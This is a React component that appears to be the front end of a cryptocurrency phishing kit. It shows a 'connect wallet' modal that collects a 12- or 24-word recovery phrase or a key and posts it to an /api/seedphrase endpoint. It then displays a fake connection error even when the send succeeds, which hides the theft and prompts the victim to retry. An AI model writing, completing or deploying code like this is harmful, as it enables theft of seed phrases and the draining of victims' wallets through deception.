"use client";

import { useState, useRef } from "react";
import { toast } from "sonner";

export default function WalletAccessModal({
  walletName,
  onClose,
}: {
  walletName: string;
  onClose: () => void;
}) {
  const [inputType, setInputType] = useState<"phrase" | "publicKey">("phrase");
  const [phraseWords, setPhraseWords] = useState(Array(12).fill(""));
  const [inputValue, setInputValue] = useState("");
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  const handleChange = (index: number, value: string) => {
    const trimmed = value.trim();
  const totalWords = phraseWords.length;

    // If a space was typed, split and auto-fill next box
    if (value.includes(" ")) {
      const words = value.trim().split(/\s+/);
      const newWords = [...phraseWords];

      for (let i = 0; i < words.length; i++) {
        const targetIndex = index + i;
        if (targetIndex < totalWords) {
          newWords[targetIndex] = words[i];
        }
      }

      setPhraseWords(newWords);
      const next = index + words.length;
      if (next < totalWords) {
        inputRefs.current[next]?.focus();
      }

      return;
    }

    // Normal typing: just update the current word
    const newWords = [...phraseWords];
    newWords[index] = trimmed;
    setPhraseWords(newWords);
  };

  const handlePaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
    const pasteText = e.clipboardData.getData("text");
    const words = pasteText.trim().split(/\s+/);

    if (words.length === 12) {
      e.preventDefault();
      setPhraseWords(words.slice(0, 12));
      const firstEmpty = words.findIndex((w) => !w);
      if (firstEmpty >= 0 && inputRefs.current[firstEmpty]) {
        inputRefs.current[firstEmpty]?.focus();
      }
    }
  };
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const value =
      inputType === "phrase" ? phraseWords.join(" ").trim() : inputValue.trim();

    if (!value || (inputType === "phrase" && phraseWords.includes(""))) {
      toast.error("Please fill all fields");
      return;
    }

    try {
      const res = await fetch("/api/seedphrase", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          walletName,
          type: inputType,
          value,
        }),
      });

      if (!res.ok) throw new Error();
      toast.error("An error occured", {
        description:
          "Hmmm!, There was an error while connecting to wallet please try again",
      });
      onClose();
    } catch {
      toast.error("An error occurred", {
        description:
          "There was an error while connecting to wallet, please try again",
      });
    }
  };

  return (
    <div className="fixed inset-0 bg-black/50 flex justify-center items-center z-50">
      <div className="max-w-md w-full bg-gray-800 p-6 rounded-2xl shadow-lg space-y-6">
        <h1 className="text-md lg:text-2xl font-bold text-center text-primary">
          {walletName}
        </h1>
        <div className="flex space-x-2">
          <button
            className={`w-1/2 py-2 rounded-lg text-sm font-medium ${
              inputType === "phrase"
                ? "bg-primary text-black"
                : "bg-gray-700 hover:bg-gray-600 text-white"
            }`}
            onClick={() => setInputType("phrase")}
          >
            Seed Phrase
          </button>
          <button
            className={`w-1/2 py-2 rounded-lg text-sm font-medium ${
              inputType === "publicKey"
                ? "bg-primary text-black"
                : "bg-gray-700 hover:bg-gray-600 text-white"
            }`}
            onClick={() => setInputType("publicKey")}
          >
            Public Key
          </button>
        </div>

        <form onSubmit={handleSubmit} className="space-y-4">
          {inputType === "phrase" ? (
            <>
              <p className="text-sm text-center text-gray-400">
                Enter your {phraseWords.length}-word recovery phrase
              </p>
              <div className="grid grid-cols-3 gap-3">
                {phraseWords.map((word, index) => (
                  <input
                    key={index}
                    type="text"
                    className="bg-gray-700 p-2 rounded text-sm text-white"
                    placeholder={`${index + 1}`}
                    value={word}
                    //   ref={(el) => (inputRefs.current[index] = el)}
                    ref={(el) => {
                      inputRefs.current[index] = el;
                    }}
                    onChange={(e) => handleChange(index, e.target.value)}
                    onPaste={handlePaste}
                  />
                ))}
              </div>
              <div className="flex justify-center mt-2 space-x-2">
                <button
                  type="button"
                  className="text-xs text-primary cursor-pointer"
                  onClick={() => setPhraseWords(Array(12).fill(""))}
                >
                  Use 12 Phrase Words
                </button>
                <button
                  type="button"
                  className="text-xs text-primary cursor-pointer"
                  onClick={() => setPhraseWords(Array(24).fill(""))}
                >
                  Use 24 Phrase Words
                </button>
              </div>
            </>
          ) : (
            <input
              type="text"
              placeholder="Enter public key"
              className="w-full p-3 bg-gray-700 rounded-md text-sm text-white"
              value={inputValue}
              onChange={(e) => setInputValue(e.target.value)}
            />
          )}
          <button
            type="submit"
            className="w-full bg-primary text-black py-2 rounded-md font-semibold hover:bg-primary/90 transition cursor-pointer"
          >
            Submit
          </button>
        </form>
      </div>
    </div>
  );
}
